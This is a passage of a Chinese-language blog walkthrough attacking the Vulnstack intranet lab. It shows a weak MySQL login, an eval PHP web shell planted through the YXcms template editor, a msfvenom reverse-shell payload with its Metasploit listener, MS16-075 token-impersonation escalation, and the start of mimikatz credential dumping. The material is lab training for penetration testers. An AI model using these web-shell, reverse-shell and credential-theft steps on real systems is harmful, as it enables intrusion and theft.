class="line">23.域渗透-利用DomainFronting实现对beacon的深度隐藏</span><br><span class="line">24.域渗透-域控实现与利用</span><br><span class="line"></span><br><span class="line">七、痕迹清理</span><br><span class="line">25、日志清理</span><br></pre></td></tr></table></figure><h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><h4 id="1-环境搭建测试"><a href="#1-环境搭建测试" class="headerlink" title="1.环境搭建测试"></a>1.环境搭建测试</h4><p>先配置靶场环境，</p><p><code>统一密码：hongrisec@2019</code>，但是有两个主机的密码是需要修改的，这里我选择修改两个server主机为了<code>@dmin123</code>。</p><p>进入问7之后发现这个负责连接外网展示web界面的主机’坏掉了’，这里需要简单地配置一下。</p><p><a href="https://troyess.com/2021/06/03/vulnstack%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98-%E4%B8%80/">vulnstack内网靶场(一)保姆级教程</a></p><p>wrwrwr我太困了，眼疼，先上床追会儿剧。</p><p>主要就是打开三个虚拟机，</p><ol><li><p>先用<code>hongrisec@2019</code>这个密码进域控虚拟机机，然后进域成员虚拟机，注意这里都是需要改密码的。</p></li><li><p>然后打开win7的虚拟机进去直接就能用<code>hongrisec@2019</code>登录，但是提示要重新启动，这时候直接选择立即重新启动。</p></li><li><p>重启之后配置网卡。我这里两个图，直接按我下面的这样应该就是可以的(大概)</p></li><li><p>再web服务器win7上的c盘，找到PHP study并将其打开。</p></li></ol><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605002015556.png" alt="虚拟网络编辑器"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605002326199.png" alt="分别配置各个虚拟机的网络"></p><p>上面域控虚拟机名字写错了，应该是server 2008的，手抖手抖。</p><p><strong>大概情况就是下面的情况：</strong></p><table><thead><tr><th>模拟内、外网的网卡名与名下ip地址</th><th>连接该网卡的虚拟机</th></tr></thead><tbody><tr><td>VMnet1&#x2F;192.168.52.0</td><td>环境里面的三个虚拟机server2008、server 2003、Windows 7都要先连接内网的网络适配器VMnet1</td></tr><tr><td>VMnet2&#x2F;192.168.72.0</td><td>负责web服务的机器Windows 7和攻击机kali都要链接这个模拟外网的网络适配器VMnet2</td></tr></tbody></table><h4 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h4><p>模拟黑盒先试试，就是不进去win7看有没有什么服务，而是直接进入攻击机 kali里面通过扫描这种资产收集方式进行信息收集</p><p><strong>1.端口扫描</strong></p><p>因为这里已经知道只有一个外部ip(win7的ip了)，所以这里也直接可以免去对目标C段的扫描了，直接掏出诸神之眼nmap扫描。</p><p><a href="https://www.cnblogs.com/liaopeng123/p/11281516.html">nmap常见命令的使用</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 192.168.72.128 -p 1-65535  # 对目标主机进行全端口快速扫描</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605004340032.png"></p><p>这里我们扫描简单得多了，因为”网络很好”，直接可以开T4，这里也是<strong>大概两分多钟</strong>就扫描完毕了，但是实战时有时T4是不行的似乎。</p><p>想看扫描过程的话加个参数<code>-v</code>即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 192.168.72.128 -v -p 1-65535</span><br></pre></td></tr></table></figure><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>80</td><td>php探针</td></tr><tr><td>3306</td><td>mysql数据库</td></tr></tbody></table><p>然后可以使用dirsearch对80端口进行一个简单的目录扫描</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605010554845.png" alt="image-20210605010554845"></p><p>80扫描到了phpMyAdmin的服务，这里应该直接在这里连接数据库3306的。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605010800401.png" alt="PHP版本"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605010832281.png" alt="phpMyAdmin"></p><p>外网能进行的信息收集也就这么多了。</p><h3 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h3><h4 id="3-漏洞搜索与利用"><a href="#3-漏洞搜索与利用" class="headerlink" title="3.漏洞搜索与利用"></a>3.漏洞搜索与利用</h4><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605005358760.png" alt="80端口的php study探针"></p><p>注意到最下方有个MySQL数据库的连接检测，简单测试了一下，是可以用弱口令进行爆破的，但是这个口令实在是太弱了，也没必要再上BurpSuite了。<code>用户名/root密码/root</code></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605005633874.png" alt="弱口令爆破处"></p><p>登录之后是英文的，把语言换成中文(Simplified)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605084538186.png" alt="/其他信息"></p><p>本来是想直接利用mysql写入shell的，但是好像是模式不对，不能写入文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建数据表导出shell，写shell到目标主机</span><br><span class="line">CREATE TABLE `mysql`.`user1` (`content` TEXT NOT NULL );</span><br><span class="line">INSERT INTO `mysql`.`user1` (`content` ) VALUES (&#x27;&lt;?php @eval($_POST[x123]);?&gt;&#x27;);</span><br><span class="line">SELECT `content` FROM `user1` INTO OUTFILE &#x27;C:\\phpStudy\\WWW\\xxx.php&#x27;;</span><br><span class="line">DROP TABLE IF EXISTS `user1`;</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605113426399.png" alt="禁止写文件"></p><p><strong>注意到还有个网站的数据库</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605113549994.png" alt="image-20210605113549994"></p><h4 id="4-后台Getshell上传技巧"><a href="#4-后台Getshell上传技巧" class="headerlink" title="4.后台Getshell上传技巧"></a>4.后台Getshell上传技巧</h4><p>经典，太经典了啊</p><p><a href="https://blog.csdn.net/LK20191121/article/details/103181514">YXcms getshell</a></p><p>这里采用的是文件上传</p><p><strong>先通过刚才的数据库信息获得该站的管理员账号密码</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605114122717.png" alt="看一下管理员的账号密码"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin/168a73655bfecefdb15b14984dd2ad60</span><br><span class="line">admin/949ba59abbe56e05</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605114222423.png" alt="将管理员的密码解一下md5"></p><p>登录网站管理员</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605114419482.png"></p><p>登不上，我人傻了，我这里有两处错误，</p><ol><li>首先是密码不是刚才解得的，还有一层hash应该是，但是我不知道怎么解，这里可以直接使用YXcms的弱口令来登入管理员，</li><li>其次就是我这个路径不对，这是一般账号登入的地方，管理员应该把member换为admin来登入即可。</li></ol><p>前台模板处可以getshell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605115353980.png"></p><p>这里直接新建一个<code>eval.php</code>文件，内容写为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;m4xlmum&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605120306642.png"></p><p>这里我没有找到前台文件的路径，但是考虑到可以使用<code>../</code>来进行目录穿越直接将文件写入站点的根目录，进根目录发现确实已经写入了。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605120551436.png" alt="没有出现404 not found就是已经把shell写入了"></p><p>使用蚁剑连接shell</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605122429678.png"></p><h4 id="5-系统信息收集"><a href="#5-系统信息收集" class="headerlink" title="5.系统信息收集"></a>5.系统信息收集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(*) 基础信息</span><br><span class="line">当前路径: C:/phpStudy/WWW</span><br><span class="line">磁盘列表: C:D:</span><br><span class="line">系统信息: Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586</span><br><span class="line">当前用户: Administrator</span><br><span class="line">(*) 输入 ashelp 查看本地命令</span><br><span class="line">C:\phpStudy\WWW&gt; cd C:/phpStudy/WWW/</span><br><span class="line"></span><br><span class="line">C:\phpStudy\WWW&gt; whoami</span><br><span class="line">god\administrator</span><br></pre></td></tr></table></figure><p><strong>连接远程桌面(rdesktop)</strong></p><p>蚁剑开一下终端，发现是域用户administrator账号的权限。这时这台主机的权限几乎就全拿到了，然后就是开一下端口方便我们进行远程连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 开windows 3389端口的命令</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"># 关windows 3389端口的命令</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure><p>下面就是<strong>连接windows远程桌面的命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali连接rdp远程桌面</span><br><span class="line"></span><br><span class="line">**命令**</span><br><span class="line">rdesktop -g 1440x900 -r disk:LinuxDisk=/root/Downloads -u administrator -p &quot;password&quot; 192.168.72.128:3389</span><br><span class="line"># 如果无rdesktop工具，可用 sudo apt install rdesktop 命令安装</span><br><span class="line"></span><br><span class="line">**参数**</span><br><span class="line">-g    # 窗口分辨率</span><br><span class="line">-r    # 本地目录共享</span><br><span class="line">-u    # 用户名</span><br><span class="line">-p    # 密码</span><br></pre></td></tr></table></figure><h4 id="6-主机密码收集"><a href="#6-主机密码收集" class="headerlink" title="6.主机密码收集"></a>6.主机密码收集</h4><p>上面的这个系统信息没什么好收集的感觉，直接尝试能不能dump出windows主机的用户名&#x2F;密码。使用msf + mimikatz</p><p>先使用msf制作一个适用于win7的后门程序，这里我直接就使用的是msf自带的payload了，没用CS的payload，一是CS和msf的联动现在还不太会，二是这个系统版本不新，也没有什么好的防御措施(例如360、卡巴斯基等等)，所以不做免杀也该也是能过的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># msf生成适用于win7的后门程序</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.72.130 LPORT=4444 -f exe -o ~/桌面/shell</span><br><span class="line">┌──(m4xlmum㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.72.130 LPORT=4444 -f exe -o ~/桌面/shell  </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: /home/m4xlmum/桌面/shell</span><br></pre></td></tr></table></figure><p>后缀名加个<code>.exe</code>就行了，生成的时候忘记加了。然后把shell上传到win7里面(使用蚁剑的上传功能)</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605134737305.png"></p><p>在蚁剑中打开一个终端，切换到这个存在shell的目录下面，使用如下命令执行shell(为保证万无一失，这里先不执行，等kali监听做好了再执行)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start shell.exe</span><br></pre></td></tr></table></figure><p><strong>配置攻击机的监听选项</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.72.130</span><br><span class="line">lhost =&gt; 192.168.72.130</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.72.130:4444 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.72.128</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.72.130:4444 -&gt; 192.168.72.128:21682) at 2021-06-05 13:55:48 +0800</span><br></pre></td></tr></table></figure><p>这里我是在run之后再去蚁剑的终端里面start那个后门程序的，这时已经获得了shell的连接了，输入shell获得powershell，然后查看自己的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2264 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Program Files&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">god\administrator</span><br></pre></td></tr></table></figure><p>虽然这里是administrator，但是却并不是SYSTEM权限，这里就需要我们再提一下权限了</p><p><strong>Windows 7 权限提升</strong></p><p>提权参考<a href="https://blog.csdn.net/nzjdsds/article/details/82262830">Windows提权辅助工具使用参考文章</a></p><p>先在蚁剑的shell下生成一个Systeminfo命令的文本文档，命名为<code>win7.txt</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Systeminfo &gt; win7.txt</span><br></pre></td></tr></table></figure><p>把这个文件拉到kali里面，然后下载<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 先更新一下数据库</span><br><span class="line">┌──(m4xlmum㉿kali)-[~/桌面/web/windows权限提升]</span><br><span class="line">└─$ python windows-exploit-suggester.py --update                            1 ⨯</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2021-06-05-mssb.xls</span><br><span class="line">[*] done</span><br></pre></td></tr></table></figure><p>然后查看可以使用的有针对性的漏洞，但是需要注意的是，使用这个工具需要下载<code>xlrd</code>python库并且版本不能太高，我用的时候报错了，重新安装了<code>pip install xlrd==1.2.0</code>才解决了，并且要使用python2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2021-06-05-mssb.xls --systeminfo win7.txt</span><br></pre></td></tr></table></figure><p>这里我截取了一部分存在远程代码执行的漏洞，看看msfdb里面有没有对应的POC，从上向下找。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important</span><br><span class="line">[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38911/ -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#x27; MCL File, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38912/ -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object - &#x27;els.dll&#x27; DLL Planting (MS15-134)</span><br><span class="line">[*]   https://code.google.com/p/google-security-research/issues/detail?id=514 -- Microsoft Office / COM Object DLL Planting with els.dll</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC</span><br></pre></td></tr></table></figure><p>但是这次不想用上面的这些漏洞，想试试msfconsole自带的一些漏洞利用工具，这里选择使用<code>post/multi/recon/local_exploit_suggester</code>，使用方法与命令如下:</p><p>漏洞利用 &amp; 权限提升</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.72.130:4444 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.72.128</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.72.130:4444 -&gt; 192.168.72.128:22785) at 2021-06-05 15:44:09 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                  Information            Connection</span><br><span class="line">  --  ----  ----                  -----------            ----------</span><br><span class="line">  2         meterpreter x86/wind  GOD\Administrator @ S  192.168.72.130:4444 -</span><br><span class="line">            ows                   TU1                    &gt; 192.168.72.128:2278</span><br><span class="line">                                                         5 (192.168.72.128)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 192.168.72.128 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 192.168.72.128 - 38 exploit checks are being tried...</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.72.128 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br></pre></td></tr></table></figure><p>上面的所有exploit只试了一个，试了试漏洞<code>ms16_075</code>，但是直接使用msf的poc似乎会出错，参考<a href="https://blog.csdn.net/cj_Allen/article/details/105489922">Metasploit下利用ms16-075提权</a>，在下面这个地方<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">下载该exploit</a></p><p><strong>ms16_075权限提升</strong></p><p>下载好上面的那个potato.exe文件之后，将这个exe文件上传至<code>c:/</code>目录下，然后执行以下命令来提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use incognito                     ：加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)</span><br><span class="line">list_tokens -u    ：列出目标主机用户的可用令牌</span><br><span class="line">execute -cH -f c:/potato.exe       :创建新的进程</span><br><span class="line">list_tokens -u :列出目标主机用户的可用令牌</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot; :假冒目标主机上的可用令牌</span><br><span class="line"></span><br><span class="line"># 实际上执行下面这三条命令应该就足够了</span><br><span class="line">use incognito</span><br><span class="line">execute -cH -f c:/potato.exe</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210605163004946.png" alt="中间错误较多，不复制粘贴了"></p><p><strong>kiwi明文密码抓取</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">[!] The &quot;kiwi&quot; extension has already been loaded.</span><br><span class="line">meterpreter &gt; help kiwi</span><br><span class="line"></span><br><span class="line">Kiwi Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                Description</span><br><span class="line">    -------                -----------</span><br><span class="line">    creds_all              Retrieve all credentials (parsed)</span><br><span class="line">    creds_kerberos         Retrieve Kerberos creds (parsed)</span><br><span class="line">    creds_livessp          Retrieve Live SSP creds</span><br><span class="line">    creds_msv              Retrieve LM/NTLM creds (parsed)</span><br><span class="line">    creds_ssp              Retrieve SSP creds</span><br><span class="line">    creds_tspkg            Retrieve TsPkg creds (parsed)</span><br><span class="line">    creds_wdigest          Retrieve WDigest creds (parsed)</span><br><span class="line">    dcsync                 Retrieve user account information via DCSync (unparsed)</span><br><span class="line">    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync</span><br><span class="line">    golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">    kerberos_ticket_list   List all kerberos tickets (unparsed)</span><br><span class="line">    kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">    kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)</span><br><span class="line">    lsa_dump_sam           Dump LSA SAM (unparsed)</span><br><span class="line">    lsa_dump_secrets       Dump LSA secrets (unparsed)</span><br><span 